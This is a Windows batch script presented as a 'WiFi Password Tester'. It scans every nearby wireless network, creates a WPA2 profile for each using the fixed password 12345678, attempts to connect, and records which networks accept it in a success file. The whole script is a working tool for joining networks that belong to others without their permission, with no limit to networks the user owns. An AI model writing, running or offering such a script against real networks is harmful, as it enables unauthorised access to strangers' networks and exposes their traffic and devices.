@echo off
setlocal enabledelayedexpansion

:: Title
title WiFi Password Tester - 12345678

:: Check for admin privileges
NET SESSION >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo This script requires administrator privileges.
    echo Please right-click and select "Run as administrator".
    pause
    exit /b
)

:: Variables
set "PASSWORD=12345678"
set "SUCCESS_FILE=successful_wifi.txt"
set "LOG_FILE=wifi_test_log.txt"
set "TEMP_PROFILE=temp_wifi_profile"

:: Initialize files
echo WiFi Networks Successfully Connected with %PASSWORD% > "%SUCCESS_FILE%"
echo ========================================= >> "%SUCCESS_FILE%"
echo WiFi Connection Test Log > "%LOG_FILE%"
echo Tested Password: %PASSWORD% >> "%LOG_FILE%"
echo Started: %date% %time% >> "%LOG_FILE%"
echo ========================================= >> "%LOG_FILE%"

:: Get list of available WiFi networks
echo Scanning for available WiFi networks...
echo Scanning for available WiFi networks... >> "%LOG_FILE%"
netsh wlan show networks mode=bssid > "%TEMP_PROFILE%_networks.txt"

:: Parse network names
set "NETWORKS="
for /f "tokens=2 delims=:" %%a in ('findstr /i /c:"SSID" "%TEMP_PROFILE%_networks.txt"') do (
    set "SSID=%%a"
    set "SSID=!SSID:~1!"
    if not "!SSID!"=="" (
        set "NETWORKS=!NETWORKS! !SSID!"
    )
)

:: Check if any networks were found
if "!NETWORKS!"=="" (
    echo No WiFi networks found.
    echo No WiFi networks found. >> "%LOG_FILE%"
    goto cleanup
)

echo Found networks:!NETWORKS!
echo Found networks:!NETWORKS! >> "%LOG_FILE%"

:: Process each network
for %%N in (!NETWORKS!) do (
    set "SSID=%%N"
    echo Testing: !SSID!
    echo Testing: !SSID! >> "%LOG_FILE%"
    
    :: Create XML profile
    echo ^<?xml version="1.0"?^> > "%TEMP_PROFILE%.xml"
    echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^> >> "%TEMP_PROFILE%.xml"
    echo     ^<name^>!SSID!^</name^> >> "%TEMP_PROFILE%.xml"
    echo     ^<SSIDConfig^> >> "%TEMP_PROFILE%.xml"
    echo         ^<SSID^> >> "%TEMP_PROFILE%.xml"
    echo             ^<name^>!SSID!^</name^> >> "%TEMP_PROFILE%.xml"
    echo         ^</SSID^> >> "%TEMP_PROFILE%.xml"
    echo     ^</SSIDConfig^> >> "%TEMP_PROFILE%.xml"
    echo     ^<connectionType^>ESS^</connectionType^> >> "%TEMP_PROFILE%.xml"
    echo     ^<connectionMode^>auto^</connectionMode^> >> "%TEMP_PROFILE%.xml"
    echo     ^<MSM^> >> "%TEMP_PROFILE%.xml"
    echo         ^<security^> >> "%TEMP_PROFILE%.xml"
    echo             ^<authEncryption^> >> "%TEMP_PROFILE%.xml"
    echo                 ^<authentication^>WPA2PSK^</authentication^> >> "%TEMP_PROFILE%.xml"
    echo                 ^<encryption^>AES^</encryption^> >> "%TEMP_PROFILE%.xml"
    echo                 ^<useOneX^>false^</useOneX^> >> "%TEMP_PROFILE%.xml"
    echo             ^</authEncryption^> >> "%TEMP_PROFILE%.xml"
    echo             ^<sharedKey^> >> "%TEMP_PROFILE%.xml"
    echo                 ^<keyType^>passPhrase^</keyType^> >> "%TEMP_PROFILE%.xml"
    echo                 ^<protected^>false^</protected^> >> "%TEMP_PROFILE%.xml"
    echo                 ^<keyMaterial^>%PASSWORD%^</keyMaterial^> >> "%TEMP_PROFILE%.xml"
    echo             ^</sharedKey^> >> "%TEMP_PROFILE%.xml"
    echo         ^</security^> >> "%TEMP_PROFILE%.xml"
    echo     ^</MSM^> >> "%TEMP_PROFILE%.xml"
    echo     ^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^> >> "%TEMP_PROFILE%.xml"
    echo         ^<enableRandomization^>false^</enableRandomization^> >> "%TEMP_PROFILE%.xml"
    echo     ^</MacRandomization^> >> "%TEMP_PROFILE%.xml"
    echo ^</WLANProfile^> >> "%TEMP_PROFILE%.xml"
    
    :: Add profile
    netsh wlan add profile filename="%TEMP_PROFILE%.xml" >> "%LOG_FILE%" 2>&1
    
    :: Attempt connection
    echo Attempting to connect to !SSID!...
    echo Attempting to connect to !SSID!... >> "%LOG_FILE%"
    netsh wlan connect name="!SSID!" >> "%LOG_FILE%" 2>&1
    
    :: Wait for connection
    ping -n 6 127.0.0.1 >nul
    
    :: Check connection status
    netsh wlan show interfaces > "%TEMP_PROFILE%_status.txt"
    findstr /i /c:"!SSID!" "%TEMP_PROFILE%_status.txt" >nul
    if !ERRORLEVEL! EQU 0 (
        echo SUCCESS: Connected to !SSID! with password %PASSWORD%
        echo SUCCESS: Connected to !SSID! with password %PASSWORD% >> "%LOG_FILE%"
        echo !SSID! >> "%SUCCESS_FILE%"
        
        :: Disconnect after successful test
        netsh wlan disconnect >> "%LOG_FILE%" 2>&1
    ) else (
        echo FAILED: Could not connect to !SSID! with password %PASSWORD%
        echo FAILED: Could not connect to !SSID! with password %PASSWORD% >> "%LOG_FILE%"
    )
    
    :: Remove temporary profile
    netsh wlan delete profile name="!SSID!" >> "%LOG_FILE%" 2>&1
    del "%TEMP_PROFILE%.xml" >nul 2>&1
)

:cleanup
:: Clean up temporary files
del "%TEMP_PROFILE%_networks.txt" >nul 2>&1
del "%TEMP_PROFILE%_status.txt" >nul 2>&1

:: Show results
echo.
echo Testing complete. Results:
type "%SUCCESS_FILE%"
echo.
echo Detailed log saved to "%LOG_FILE%"
echo Successful connections saved to "%SUCCESS_FILE%"
pause